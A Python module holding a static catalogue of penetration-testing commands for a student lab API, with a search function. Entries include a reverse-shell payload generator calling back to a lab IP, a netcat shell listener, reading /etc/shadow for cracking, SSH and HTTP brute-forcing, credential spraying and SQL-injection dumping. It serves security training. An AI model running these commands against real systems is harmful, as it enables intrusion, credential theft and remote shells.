"""Curated, offline catalogue of common cybersecurity tool commands.

Served by ``GET /api/commands``. This is static reference data — no external calls
and safe to use inside isolated student labs (authorized training only).
"""

from __future__ import annotations

# Each entry: tool, command, description, category, tags
COMMANDS: list[dict] = [
    # --- nmap ---------------------------------------------------------------
    {"tool": "nmap", "command": "nmap -sV 10.0.0.5", "description": "Service/version detection on a host.", "category": "recon", "tags": ["scanning", "ports", "version"]},
    {"tool": "nmap", "command": "nmap -sS -p- 10.0.0.0/24", "description": "Stealth SYN scan of all 65535 ports across a subnet.", "category": "recon", "tags": ["scanning", "syn", "subnet"]},
    {"tool": "nmap", "command": "nmap -A -T4 target", "description": "Aggressive scan: OS detection, versions, scripts, traceroute.", "category": "recon", "tags": ["os", "aggressive", "scripts"]},
    {"tool": "nmap", "command": "nmap -sU --top-ports 50 target", "description": "Scan the 50 most common UDP ports.", "category": "recon", "tags": ["udp", "ports"]},
    {"tool": "nmap", "command": "nmap --script vuln target", "description": "Run the NSE vulnerability detection scripts.", "category": "vuln", "tags": ["nse", "vulnerability", "scripts"]},
    {"tool": "nmap", "command": "nmap -Pn -p 80,443 target", "description": "Skip host discovery and scan specific ports.", "category": "recon", "tags": ["no-ping", "ports"]},

    # --- masscan ------------------------------------------------------------
    {"tool": "masscan", "command": "masscan 10.0.0.0/8 -p80,443 --rate 1000", "description": "Very fast internet-scale port scanner.", "category": "recon", "tags": ["scanning", "fast", "ports"]},

    # --- hydra --------------------------------------------------------------
    {"tool": "hydra", "command": "hydra -l admin -P rockyou.txt ssh://10.0.0.5", "description": "Brute-force SSH login with a password list.", "category": "password", "tags": ["bruteforce", "ssh", "login"]},
    {"tool": "hydra", "command": "hydra -L users.txt -P pass.txt ftp://target", "description": "Spray user/password lists against FTP.", "category": "password", "tags": ["bruteforce", "ftp"]},
    {"tool": "hydra", "command": "hydra -l admin -P pass.txt target http-post-form \"/login:user=^USER^&pass=^PASS^:Invalid\"", "description": "Brute-force an HTTP POST login form.", "category": "password", "tags": ["bruteforce", "http", "web"]},

    # --- john ---------------------------------------------------------------
    {"tool": "john", "command": "john --wordlist=rockyou.txt hashes.txt", "description": "Crack password hashes with a wordlist.", "category": "password", "tags": ["cracking", "hashes", "wordlist"]},
    {"tool": "john", "command": "john --show hashes.txt", "description": "Show already-cracked passwords.", "category": "password", "tags": ["cracking", "hashes"]},
    {"tool": "john", "command": "unshadow /etc/passwd /etc/shadow > hashes.txt", "description": "Combine passwd and shadow files for cracking.", "category": "password", "tags": ["linux", "hashes", "shadow"]},

    # --- hashcat ------------------------------------------------------------
    {"tool": "hashcat", "command": "hashcat -m 0 -a 0 hashes.txt rockyou.txt", "description": "Dictionary attack on raw MD5 hashes.", "category": "password", "tags": ["cracking", "md5", "gpu"]},
    {"tool": "hashcat", "command": "hashcat -m 1000 -a 0 ntlm.txt rockyou.txt", "description": "Crack NTLM hashes with a wordlist.", "category": "password", "tags": ["cracking", "ntlm", "windows"]},
    {"tool": "hashcat", "command": "hashcat -m 22000 capture.hc22000 rockyou.txt", "description": "Crack WPA/WPA2 handshakes.", "category": "wireless", "tags": ["cracking", "wifi", "wpa"]},

    # --- gobuster -----------------------------------------------------------
    {"tool": "gobuster", "command": "gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt", "description": "Brute-force web directories and files.", "category": "web", "tags": ["enumeration", "directories", "web"]},
    {"tool": "gobuster", "command": "gobuster dns -d target.com -w subdomains.txt", "description": "Enumerate subdomains via DNS.", "category": "recon", "tags": ["dns", "subdomains"]},
    {"tool": "gobuster", "command": "gobuster vhost -u http://target -w vhosts.txt", "description": "Discover virtual hosts on a web server.", "category": "web", "tags": ["vhost", "web"]},

    # --- ffuf / dirb --------------------------------------------------------
    {"tool": "ffuf", "command": "ffuf -w wordlist.txt -u http://target/FUZZ", "description": "Fast web fuzzer for content discovery.", "category": "web", "tags": ["fuzzing", "web", "enumeration"]},
    {"tool": "ffuf", "command": "ffuf -w params.txt -u 'http://target/page?FUZZ=1' -fc 404", "description": "Fuzz GET parameters, filtering 404 responses.", "category": "web", "tags": ["fuzzing", "parameters"]},
    {"tool": "dirb", "command": "dirb http://target /usr/share/wordlists/dirb/common.txt", "description": "Classic web content scanner.", "category": "web", "tags": ["enumeration", "directories"]},

    # --- sqlmap -------------------------------------------------------------
    {"tool": "sqlmap", "command": "sqlmap -u 'http://target/item?id=1' --batch", "description": "Automatically detect and exploit SQL injection.", "category": "web", "tags": ["sqli", "injection", "database"]},
    {"tool": "sqlmap", "command": "sqlmap -u 'http://target/item?id=1' --dbs", "description": "Enumerate databases via SQL injection.", "category": "web", "tags": ["sqli", "database", "enumeration"]},
    {"tool": "sqlmap", "command": "sqlmap -r request.txt --dump", "description": "Replay a saved request and dump tables.", "category": "web", "tags": ["sqli", "dump", "database"]},

    # --- nikto --------------------------------------------------------------
    {"tool": "nikto", "command": "nikto -h http://target", "description": "Scan a web server for known vulnerabilities and misconfigurations.", "category": "web", "tags": ["scanner", "vulnerability", "web"]},
    {"tool": "nikto", "command": "nikto -h target -p 443 -ssl", "description": "Scan an HTTPS service.", "category": "web", "tags": ["scanner", "ssl", "web"]},

    # --- metasploit ---------------------------------------------------------
    {"tool": "metasploit", "command": "msfconsole -q", "description": "Launch the Metasploit console quietly.", "category": "exploitation", "tags": ["framework", "console"]},
    {"tool": "metasploit", "command": "search type:exploit platform:linux", "description": "Search available Linux exploit modules.", "category": "exploitation", "tags": ["search", "modules"]},
    {"tool": "metasploit", "command": "use exploit/multi/handler", "description": "Set up a handler to catch a reverse shell.", "category": "exploitation", "tags": ["handler", "payload", "shell"]},
    {"tool": "msfvenom", "command": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.2 LPORT=4444 -f elf -o shell.elf", "description": "Generate a Linux reverse-shell payload.", "category": "exploitation", "tags": ["payload", "reverse-shell", "generator"]},

    # --- netcat -------------------------------------------------------------
    {"tool": "netcat", "command": "nc -lvnp 4444", "description": "Listen on a port for an incoming reverse shell.", "category": "networking", "tags": ["listener", "reverse-shell", "pivot"]},
    {"tool": "netcat", "command": "nc target 80", "description": "Connect to a TCP port for banner grabbing / manual requests.", "category": "networking", "tags": ["connect", "banner"]},
    {"tool": "netcat", "command": "nc -w3 target 1-1000", "description": "Simple port sweep with a timeout.", "category": "networking", "tags": ["scan", "ports"]},

    # --- tcpdump ------------------------------------------------------------
    {"tool": "tcpdump", "command": "tcpdump -i eth0 -w capture.pcap", "description": "Capture packets on an interface to a file.", "category": "networking", "tags": ["sniffing", "capture", "pcap"]},
    {"tool": "tcpdump", "command": "tcpdump -i eth0 port 80 -A", "description": "Show HTTP traffic in ASCII.", "category": "networking", "tags": ["sniffing", "http"]},
    {"tool": "tcpdump", "command": "tcpdump -n host 10.0.0.5", "description": "Capture traffic to/from a specific host.", "category": "networking", "tags": ["sniffing", "filter"]},

    # --- wireshark / tshark -------------------------------------------------
    {"tool": "tshark", "command": "tshark -i eth0 -f 'tcp port 443'", "description": "Terminal Wireshark capture with a BPF filter.", "category": "networking", "tags": ["sniffing", "capture", "tls"]},
    {"tool": "tshark", "command": "tshark -r capture.pcap -Y 'http.request'", "description": "Read a pcap and display only HTTP requests.", "category": "networking", "tags": ["analysis", "http", "pcap"]},

    # --- openssl ------------------------------------------------------------
    {"tool": "openssl", "command": "openssl s_client -connect target:443", "description": "Inspect a TLS service and its certificate.", "category": "crypto", "tags": ["tls", "certificate", "handshake"]},
    {"tool": "openssl", "command": "openssl x509 -in cert.pem -text -noout", "description": "Decode and print an X.509 certificate.", "category": "crypto", "tags": ["certificate", "x509"]},
    {"tool": "openssl", "command": "openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem", "description": "Generate a self-signed certificate and key.", "category": "crypto", "tags": ["certificate", "rsa", "generate"]},
    {"tool": "openssl", "command": "openssl enc -aes-256-cbc -salt -in file -out file.enc", "description": "Encrypt a file with AES-256-CBC.", "category": "crypto", "tags": ["encryption", "aes"]},

    # --- dig / dns ----------------------------------------------------------
    {"tool": "dig", "command": "dig target.com ANY", "description": "Query all DNS records for a domain.", "category": "recon", "tags": ["dns", "enumeration"]},
    {"tool": "dig", "command": "dig axfr @ns1.target.com target.com", "description": "Attempt a DNS zone transfer.", "category": "recon", "tags": ["dns", "zone-transfer"]},
    {"tool": "dig", "command": "dig -x 10.0.0.5", "description": "Reverse DNS lookup for an IP.", "category": "recon", "tags": ["dns", "reverse"]},
    {"tool": "dnsenum", "command": "dnsenum target.com", "description": "Enumerate DNS info, subdomains, and zone transfers.", "category": "recon", "tags": ["dns", "subdomains"]},

    # --- curl / wget --------------------------------------------------------
    {"tool": "curl", "command": "curl -I http://target", "description": "Fetch only the HTTP response headers.", "category": "web", "tags": ["http", "headers"]},
    {"tool": "curl", "command": "curl -s -X POST -d 'a=1&b=2' http://target/api", "description": "Send a POST request with form data.", "category": "web", "tags": ["http", "post", "api"]},
    {"tool": "curl", "command": "curl -k https://target -H 'Authorization: Bearer TOKEN'", "description": "Authenticated HTTPS request ignoring cert errors.", "category": "web", "tags": ["http", "auth", "tls"]},
    {"tool": "wget", "command": "wget -r -np http://target/files/", "description": "Recursively mirror a directory of files.", "category": "web", "tags": ["download", "mirror"]},

    # --- enum4linux / smb ---------------------------------------------------
    {"tool": "enum4linux", "command": "enum4linux -a 10.0.0.5", "description": "Full SMB/Samba enumeration of a Windows host.", "category": "recon", "tags": ["smb", "windows", "enumeration"]},
    {"tool": "smbclient", "command": "smbclient -L //10.0.0.5 -N", "description": "List SMB shares anonymously.", "category": "recon", "tags": ["smb", "shares"]},
    {"tool": "crackmapexec", "command": "crackmapexec smb 10.0.0.0/24 -u user -p pass", "description": "Spray SMB credentials across a subnet.", "category": "password", "tags": ["smb", "spray", "windows"]},

    # --- wpscan -------------------------------------------------------------
    {"tool": "wpscan", "command": "wpscan --url http://target --enumerate u", "description": "Enumerate WordPress users.", "category": "web", "tags": ["wordpress", "enumeration"]},
    {"tool": "wpscan", "command": "wpscan --url http://target --enumerate vp", "description": "Enumerate vulnerable WordPress plugins.", "category": "web", "tags": ["wordpress", "plugins", "vulnerability"]},

    # --- aircrack-ng / wireless --------------------------------------------
    {"tool": "aircrack-ng", "command": "aircrack-ng -w rockyou.txt capture.cap", "description": "Crack a captured WPA handshake.", "category": "wireless", "tags": ["wifi", "wpa", "cracking"]},
    {"tool": "airmon-ng", "command": "airmon-ng start wlan0", "description": "Put a wireless card into monitor mode.", "category": "wireless", "tags": ["wifi", "monitor"]},

    # --- ssh / tunneling ----------------------------------------------------
    {"tool": "ssh", "command": "ssh -L 8080:127.0.0.1:80 user@target", "description": "Local port forward through SSH.", "category": "networking", "tags": ["tunnel", "port-forward", "pivot"]},
    {"tool": "ssh", "command": "ssh -D 1080 user@target", "description": "Create a SOCKS proxy over SSH for pivoting.", "category": "networking", "tags": ["tunnel", "socks", "pivot"]},

    # --- misc ---------------------------------------------------------------
    {"tool": "whatweb", "command": "whatweb http://target", "description": "Fingerprint web technologies in use.", "category": "web", "tags": ["fingerprint", "recon"]},
    {"tool": "searchsploit", "command": "searchsploit apache 2.4", "description": "Search the Exploit-DB archive offline.", "category": "exploitation", "tags": ["exploit-db", "search"]},
    {"tool": "steghide", "command": "steghide extract -sf image.jpg", "description": "Extract data hidden in an image.", "category": "forensics", "tags": ["steganography", "ctf"]},
    {"tool": "binwalk", "command": "binwalk -e firmware.bin", "description": "Analyze and extract embedded files from firmware.", "category": "forensics", "tags": ["firmware", "extraction"]},
    {"tool": "hashid", "command": "hashid '5f4dcc3b5aa765d61d8327deb882cf99'", "description": "Identify the type of a given hash.", "category": "password", "tags": ["hashes", "identify"]},
]


def search(query: str, limit: int = 100) -> list[dict]:
    """Case-insensitive search across tool, command, description, and tags."""
    q = (query or "").strip().lower()
    if not q:
        return COMMANDS[:limit]
    terms = q.split()
    results: list[dict] = []
    for entry in COMMANDS:
        haystack = " ".join(
            [
                entry["tool"],
                entry["command"],
                entry["description"],
                " ".join(entry.get("tags", [])),
                entry.get("category", ""),
            ]
        ).lower()
        if all(term in haystack for term in terms):
            results.append(entry)
    return results[:limit]
